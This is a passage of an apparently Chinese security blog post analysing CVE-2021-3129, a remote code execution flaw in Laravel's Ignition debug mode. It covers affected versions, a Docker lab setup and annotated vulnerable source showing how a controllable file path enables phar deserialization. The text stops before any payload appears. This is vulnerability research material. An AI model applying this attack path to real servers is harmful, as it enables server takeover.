<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129" />
<meta property="og:description" content="Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129 漏洞描述 Laravel 是一个免费的开源 PHP Web 框架，旨在实现的Web软件的MVC架构。2021年1月13日，阿里云" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://example.org/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://example.org/logo.png"/>

<meta name="twitter:title" content="Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129"/>
<meta name="twitter:description" content="Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129 漏洞描述 Laravel 是一个免费的开源 PHP Web 框架，旨在实现的Web软件的MVC架构。2021年1月13日，阿里云"/>
<meta name="twitter:site" content="@xxxx"/>
<meta name="application-name" content="Chinchin&#39;s blog">
<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/" /><link rel="prev" href="http://example.org/limesurvey-limesurveyfilemanager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-11455/" /><link rel="next" href="http://example.org/laravel-filemanager%E6%8F%92%E4%BB%B6-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-40734/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/example.org\/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129\/"
        },"genre": "posts","keywords": "漏洞知识库","wordcount":  6549 ,
        "url": "http:\/\/example.org\/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "Chinchin"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/tags/" title="标签"> 标签 </a><a class="menu-item" href="/categories/" title="分类"> 分类 </a><a class="menu-item" href="/unknownformat/" title="未知格式"> 未知格式 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/tags/" title="标签">标签</a><a class="menu-item" href="/categories/" title="分类">分类</a><a class="menu-item" href="/unknownformat/" title="未知格式">未知格式</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;6549 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;14 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="true">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#漏洞描述">漏洞描述</a></li>
    <li><a href="#漏洞影响">漏洞影响</a></li>
    <li><a href="#环境搭建">环境搭建</a></li>
    <li><a href="#漏洞复现">漏洞复现</a></li>
    <li><a href="#漏洞poc">漏洞POC</a></li>
    <li><a href="#参考文章">参考文章</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="laravel-小于-842-debug模式-_ignition-远程代码执行漏洞-cve-2021-3129">Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129</h1>
<h2 id="漏洞描述">漏洞描述</h2>
<p>Laravel 是一个免费的开源 PHP Web 框架，旨在实现的Web软件的MVC架构。2021年1月13日，阿里云应急响应中心监控到国外某安全研究团队披露了 Laravel &lt;= 8.4.2 存在远程代码执行漏洞。当Laravel开启了Debug模式时，由于Laravel自带的Ignition功能的某些接口存在过滤不严，攻击者可以发起恶意请求，通过构造恶意Log文件等方式触发Phar反序列化，从而造成远程代码执行，控制服务器。漏洞细节已在互联网公开。阿里云应急响应中心提醒 Laravel 用户尽快采取安全措施阻止漏洞攻击。</p>
<h2 id="漏洞影响">漏洞影响</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Laravel 框架 &lt; 8.4.3
</span></span><span class="line"><span class="cl">facade ignition 组件 &lt; 2.5.2
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="环境搭建">环境搭建</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">https://github.com/SNCKER/CVE-2021-3129.git
</span></span><span class="line"><span class="cl">docker-compose up -d
</span></span></code></pre></td></tr></table>
</div>
</div><p>点击生成密钥出现如下图即成功创建漏洞环境</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/202202091314354.png"
        data-srcset="/images/202202091314354.png, /images/202202091314354.png 1.5x, /images/202202091314354.png 2x"
        data-sizes="auto"
        alt="/images/202202091314354.png"
        title="/images/202202091314354.png" /></p>
<h2 id="漏洞复现">漏洞复现</h2>
<p>按照漏洞公开文章需要先有一个未知变量的错误，来点击 <strong>Make variable optional</strong></p>
<ul>
<li>按照官方手册创建路由和View模板</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/202202091314535.png"
        data-srcset="/images/202202091314535.png, /images/202202091314535.png 1.5x, /images/202202091314535.png 2x"
        data-sizes="auto"
        alt="/images/202202091314535.png"
        title="/images/202202091314535.png" /></p>
<p>通过点击“Make variableOptional”按钮，模板变量则会被修改。如果检查HTTP日志，我们就会看到被调用的端点</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/202202091314898.png"
        data-srcset="/images/202202091314898.png, /images/202202091314898.png 1.5x, /images/202202091314898.png 2x"
        data-sizes="auto"
        alt="/images/202202091314898.png"
        title="/images/202202091314898.png" /></p>
<p>通过这些solutions，开发者可以通过点击按钮的方式，快速修复一些错误。本次漏洞就是其中的<code>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</code>过滤不严谨导致的。首先我们到执行solution的控制器当中去，看看是如何调用到solution的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Facade\Ignition\Http\Controllers</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">Facade\Ignition\Http\Requests\ExecuteSolutionRequest</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">Facade\IgnitionContracts\SolutionProviderRepository</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">Illuminate\Foundation\Validation\ValidatesRequests</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ExecuteSolutionController</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">ValidatesRequests</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ExecuteSolutionRequest</span> <span class="nv">$request</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">SolutionProviderRepository</span> <span class="nv">$solutionProviderRepository</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$solution</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getRunnableSolution</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$solution</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;parameters&#39;</span><span class="p">,</span> <span class="p">[]));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">response</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>接着调用solution对象中的<code>run()</code>方法，并将可控的<code>parameters</code>参数传过去。通过这个点我们可以调用到<code>MakeViewVariableOptionalSolution::run()</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Facade\Ignition\Solutions</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">Facade\IgnitionContracts\RunnableSolution</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">Illuminate\Support\Facades\Blade</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">MakeViewVariableOptionalSolution</span> <span class="k">implements</span> <span class="nx">RunnableSolution</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">run</span><span class="p">(</span><span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[])</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">makeOptional</span><span class="p">(</span><span class="nv">$parameters</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$output</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$parameters</span><span class="p">[</span><span class="s1">&#39;viewFile&#39;</span><span class="p">],</span> <span class="nv">$output</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">makeOptional</span><span class="p">(</span><span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[])</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$originalContents</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$parameters</span><span class="p">[</span><span class="s1">&#39;viewFile&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nv">$newContents</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;$&#39;</span><span class="o">.</span><span class="nv">$parameters</span><span class="p">[</span><span class="s1">&#39;variableName&#39;</span><span class="p">],</span> <span class="s1">&#39;$&#39;</span><span class="o">.</span><span class="nv">$parameters</span><span class="p">[</span><span class="s1">&#39;variableName&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34; ?? &#39;&#39;&#34;</span><span class="p">,</span> <span class="nv">$originalContents</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$originalTokens</span> <span class="o">=</span> <span class="nx">token_get_all</span><span class="p">(</span><span class="nx">Blade</span><span class="o">::</span><span class="na">compileString</span><span class="p">(</span><span class="nv">$originalContents</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$newTokens</span> <span class="o">=</span> <span class="nx">token_get_all</span><span class="p">(</span><span class="nx">Blade</span><span class="o">::</span><span class="na">compileString</span><span class="p">(</span><span class="nv">$newContents</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$expectedTokens</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">generateExpectedTokens</span><span class="p">(</span><span class="nv">$originalTokens</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">[</span><span class="s1">&#39;variableName&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$expectedTokens</span> <span class="o">!==</span> <span class="nv">$newTokens</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$newContents</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="k">function</span> <span class="nf">generateExpectedTokens</span><span class="p">(</span><span class="k">array</span> <span class="nv">$originalTokens</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$variableName</span><span class="p">)</span><span class="o">:</span> <span class="k">array</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$expectedTokens</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$originalTokens</span> <span class="k">as</span> <span class="nv">$token</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$expectedTokens</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$token</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$token</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="nx">T_VARIABLE</span> <span class="o">&amp;&amp;</span> <span class="nv">$token</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;$&#39;</span><span class="o">.</span><span class="nv">$variableName</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$expectedTokens</span><span class="p">[]</span> <span class="o">=</span> <span class="p">[</span><span class="nx">T_WHITESPACE</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nv">$token</span><span class="p">[</span><span class="mi">2</span><span class="p">]];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$expectedTokens</span><span class="p">[]</span> <span class="o">=</span> <span class="p">[</span><span class="nx">T_COALESCE</span><span class="p">,</span> <span class="s1">&#39;??&#39;</span><span class="p">,</span> <span class="nv">$token</span><span class="p">[</span><span class="mi">2</span><span class="p">]];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$expectedTokens</span><span class="p">[]</span> <span class="o">=</span> <span class="p">[</span><span class="nx">T_WHITESPACE</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nv">$token</span><span class="p">[</span><span class="mi">2</span><span class="p">]];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$expectedTokens</span><span class="p">[]</span> <span class="o">=</span> <span class="p">[</span><span class="nx">T_CONSTANT_ENCAPSED_STRING</span><span class="p">,</span> <span class="s2">&#34;&#39;&#39;&#34;</span><span class="p">,</span> <span class="nv">$token</span><span class="p">[</span><span class="mi">2</span><span class="p">]];</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$expectedTokens</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到这里主要功能点是：读取一个给定的路径，并替换<code>$variableName</code>为<code>$variableName ?? ''</code>，之后写回文件中。由于这里调用了<code>file_get_contents()</code>，且其中的参数可控，所以这里可以通过<code>phar://</code>协议去触发phar反序列化。如果后期利用框架进行开发的人员，写出了一个文件上传的功能。那么我们就可以上传一个恶意phar文件，利用上述的<code>file_get_contents()</code>去触发phar反序列化，达到rce的效果。</p>
<p>除了解决方案的类名之外，还发送了一个文件路径和一个我们要替换的变量名。这看起来非常让人感兴趣。</p>
<p>让我们先检查一下类名的利用方法：我们可以实例化任意的类吗？</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">SolutionProviderRepository</span> <span class="k">implements</span> <span class="nx">SolutionProviderRepositoryContract</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getSolutionForClass</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$solutionClass</span><span class="p">)</span><span class="o">:</span> <span class="o">?</span><span class="nx">Solution</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">class_exists</span><span class="p">(</span><span class="nv">$solutionClass</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">in_array</span><span class="p">(</span><span class="nx">Solution</span><span class="o">::</span><span class="na">class</span><span class="p">,</span> <span class="nx">class_implements</span><span class="p">(</span><span class="nv">$solutionClass</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">app</span><span class="p">(</span><span class="nv">$solutionClass</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>答案是否定的：Ignition总是用我们指向的类来实现<strong>RunnableSolution</strong></p>
<p>那么，让我们仔细看看这个类。实际上，负责该操作的代码位**./vendor/facade/ignition/sr/solutions/MakeViewVariableOptionalSolution.php**文件中。那么，我们可以更改任意文件的内容么？</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
